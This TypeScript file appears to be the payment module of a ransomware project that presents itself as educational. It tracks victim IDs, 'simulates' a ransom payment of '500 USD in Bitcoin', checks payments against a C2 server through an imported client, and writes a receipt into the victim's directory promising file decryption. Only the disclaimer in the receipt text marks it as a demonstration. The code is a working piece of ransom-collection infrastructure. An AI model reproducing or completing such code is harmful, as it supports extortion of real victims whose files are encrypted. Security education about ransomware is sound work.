import fs from 'fs'
import path from 'path'
import crypto from 'crypto'
import { getC2Client } from './keyManager'

// Interface for payment records
interface PaymentRecord {
    victimId: string
    transactionId: string
    amount: string
    timestamp: string
    status: 'pending' | 'verified' | 'rejected'
}

// Store for payment records (for offline mode)
const paymentRecords: PaymentRecord[] = []

// Track if we're in offline mode
let isOfflineMode = false;

// Generate a fake transaction ID
export function generateTransactionId(): string {
    return crypto.randomBytes(16).toString('hex')
}

// Simulate a payment from the victim
export async function simulatePayment(
    victimId: string,
    amount: string = '500 USD in Bitcoin'
): Promise<{ transactionId: string; timestamp: string }> {
    const transactionId = generateTransactionId()
    const timestamp = new Date().toISOString()

    // Add to payment records
    paymentRecords.push({
        victimId,
        transactionId,
        amount,
        timestamp,
        status: 'pending'
    })

    try {
        // Try to connect to the C2 server and register the payment
        if (!isOfflineMode) {
            const client = getC2Client();
            await client.connect();
            console.log(`[+] Registering payment with C2 server for victim: ${victimId}`);
        }
    } catch (error) {
        console.error('[-] Error connecting to C2 server during payment:', error);
        console.log('[*] Continuing in offline mode');
        isOfflineMode = true;
    }

    return { transactionId, timestamp }
}

// Verify a payment with the C2 server
export async function verifyPayment(transactionId: string, victimId?: string): Promise<boolean> {
    try {
        // Try C2 server verification first
        if (!isOfflineMode) {
            const client = getC2Client();
            if (victimId) {
                return await client.verifyPayment(victimId, transactionId);
            } 
            
            // If no victim ID specified, try to find it in local records
            const localRecord = paymentRecords.find(
                (record) => record.transactionId === transactionId
            );
            
            if (localRecord) {
                return await client.verifyPayment(localRecord.victimId, transactionId);
            }
        }
    } catch (error) {
        console.error('Error verifying payment with C2 server:', error);
        console.warn('Falling back to local payment verification');
        isOfflineMode = true;
    }

    // Fallback to local verification if server is unreachable or we're in offline mode
    const paymentRecord = paymentRecords.find(
        (record) => record.transactionId === transactionId
    );

    if (!paymentRecord) {
        return false;
    }

    // Simulate verification
    paymentRecord.status = 'verified';

    return true;
}

// Create a payment receipt
export async function createPaymentReceipt(
    victimId: string,
    transactionId: string,
    targetDirectory: string
): Promise<void> {
    // Try to find the payment record locally first
    let paymentRecord = paymentRecords.find(
        (record) =>
            record.victimId === victimId &&
            record.transactionId === transactionId
    );
    
    // If not found locally and we're not in offline mode, try to verify with server
    if (!paymentRecord && !isOfflineMode) {
        try {
            const client = getC2Client();
            const verified = await client.verifyPayment(victimId, transactionId);
            
            if (verified) {
                // Create a record if verification was successful
                paymentRecord = {
                    victimId,
                    transactionId,
                    amount: "Amount verified by server",
                    timestamp: new Date().toISOString(),
                    status: 'verified'
                };
            }
        } catch (error) {
            console.error('[-] Error verifying payment with server:', error);
            console.log('[*] Continuing in offline mode');
            isOfflineMode = true;
        }
    }

    if (!paymentRecord) {
        throw new Error(
            `Payment record not found for victim ID ${victimId} and transaction ID ${transactionId}`
        )
    }

    const receiptPath = path.join(targetDirectory, 'PAYMENT_RECEIPT.txt')
    const receiptContent = `
╔══════════════════════════════════════════════════════════════════════════════╗
║                                PAYMENT RECEIPT                                ║
╚══════════════════════════════════════════════════════════════════════════════╝

DEMONSTRATION ONLY - NO REAL PAYMENT WAS MADE

Victim ID: ${paymentRecord.victimId}
Transaction ID: ${paymentRecord.transactionId}
Amount: ${paymentRecord.amount}
Date: ${new Date(paymentRecord.timestamp).toLocaleString()}
Status: ${paymentRecord.status.toUpperCase()}

This is a simulated payment for educational purposes only.
No actual cryptocurrency or money was transferred.

Your files will now be decrypted. Thank you for participating in this
security education demonstration.
`

    fs.writeFileSync(receiptPath, receiptContent)
}
